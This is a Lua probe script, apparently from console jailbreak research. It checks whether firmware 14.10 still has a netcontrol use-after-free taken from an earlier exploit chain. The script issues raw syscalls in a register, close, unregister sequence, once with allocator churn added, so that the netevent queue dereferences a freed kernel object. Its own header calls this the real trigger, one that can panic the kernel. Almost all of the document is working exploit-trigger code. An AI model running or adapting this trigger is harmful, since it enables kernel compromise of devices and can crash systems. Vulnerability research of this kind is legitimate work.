-- CRASH_CLASS: HIGH
-- PROBE 220a: netcontrol, unregister a descriptor that was closed and not reclaimed
--
-- Context: 219a registers a socket, closes it while registered, and lets a
-- fresh socket reclaim the descriptor number before unregistering, so the queue
-- is never pointed at memory the allocator has handed to something else. This
-- probe drops that reclaim step and is the sharp form of the same question:
--
--     register(fd) -> close(fd) -> unregister(fd)
--
-- In the <=12.00 chain (Poops, from TheFlow's ExploitNetControlImpl) this
-- sequence makes the netevent queue drop a reference to a file that was already
-- freed, which is the use-after-free the chain builds on. If 14.10 still does
-- that, the unregister dereferences freed memory.
--
-- What the answer means:
--
--   unregister -> -1   the queue looks the descriptor up again at clear time and
--                      finds no such object, so the close-during-register free
--                      path does not exist here
--   unregister -> 0    the queue kept its own reference; the entry outlived the
--                      close, and what it frees is now whatever the allocator
--                      put in that slot
--
-- RISK: this is the trigger, not a simulation of it. There is no reclaim and no
-- spray, so a freed-object dereference can land on anything. A kernel panic is
-- a real outcome, and it needs a power cycle to clear. Run it only when the
-- console can be rebooted and the 218a/219a results are already saved.

print("=== PROBE 220a: netcontrol unregister after close ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u64(v)
    if type(v) == "number" then return uint64(string.format("0x%08X", v)) end
    return v
end
local function sgn(v)
    if v == nil then return "killed" end
    if v >= 0x80000000 then return tostring(v - 0x100000000) end
    return tostring(v)
end
local dead = false

local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0), u64(a4 or 0), u64(a5 or 0), u64(a6 or 0))
    end)
    if not ok then
        dead = true
        return nil, nil
    end
    return ret, to_num(ret)
end

local BUF = memory.alloc(0x20)
local function zero(addr, n)
    for i = 0, n - 1, 4 do
        pcall(function() memory.write_dword(addr + i, 0) end)
    end
end
local function wd(addr, v)
    return (pcall(function() memory.write_dword(addr, v) end))
end

local SET_QUEUE = 0x20000003
local CLEAR_QUEUE = 0x20000007
local RETIRED = 0xFFFFFFFF

local function pid()
    local _, v = call(20)
    return sgn(v)
end

print("[A] control: register, unregister, both on the open descriptor")
local _, afd = call(97, 1, 1, 0)
print("    socket -> " .. sgn(afd))
if afd ~= nil and afd >= 0 then
    zero(BUF, 0x10)
    wd(BUF, afd)
    local _, a1 = call(99, RETIRED, SET_QUEUE, BUF, 8)
    local _, a2 = call(99, RETIRED, CLEAR_QUEUE, BUF, 8)
    local _, ac = call(6, afd)
    print(string.format("    register %s  unregister %s  close %s  pid %s",
        sgn(a1), sgn(a2), sgn(ac), pid()))
end
print("")

print("[B] register, close, then unregister with nothing reclaiming the number")
local _, bfd = call(97, 1, 1, 0)
print("    socket -> " .. sgn(bfd))
if bfd ~= nil and bfd >= 0 and not dead then
    zero(BUF, 0x10)
    wd(BUF, bfd)
    local _, b1 = call(99, RETIRED, SET_QUEUE, BUF, 8)
    print("    register -> " .. sgn(b1))
    if not dead then
        local _, b2 = call(6, bfd)
        print("    close    -> " .. sgn(b2))
    end
    if not dead then
        print("    pid before unregister -> " .. pid())
        local _, b3 = call(99, RETIRED, CLEAR_QUEUE, BUF, 8)
        print("    unregister -> " .. sgn(b3))
        print("    pid after  -> " .. pid())
    end
end
print("")

print("[C] second pass, with the allocator disturbed between close and unregister")
if not dead then
    local _, cfd = call(97, 1, 1, 0)
    print("    socket -> " .. sgn(cfd))
    if cfd ~= nil and cfd >= 0 then
        zero(BUF, 0x10)
        wd(BUF, cfd)
        local _, c1 = call(99, RETIRED, SET_QUEUE, BUF, 8)
        local _, c2 = call(6, cfd)
        print("    register " .. sgn(c1) .. "  close " .. sgn(c2))
        local made = {}
        for i = 1, 4 do
            local _, s = call(97, 1, 1, 0)
            made[i] = s
        end
        print(string.format("    churn sockets %s %s %s %s",
            sgn(made[1]), sgn(made[2]), sgn(made[3]), sgn(made[4])))
        local _, c3 = call(99, RETIRED, CLEAR_QUEUE, BUF, 8)
        print("    unregister -> " .. sgn(c3))
        print("    pid after  -> " .. pid())
        for i = 1, 4 do
            if made[i] ~= nil and made[i] >= 0 then call(6, made[i]) end
        end
    end
end
print("")
print("=== PROBE 220a COMPLETE ===")
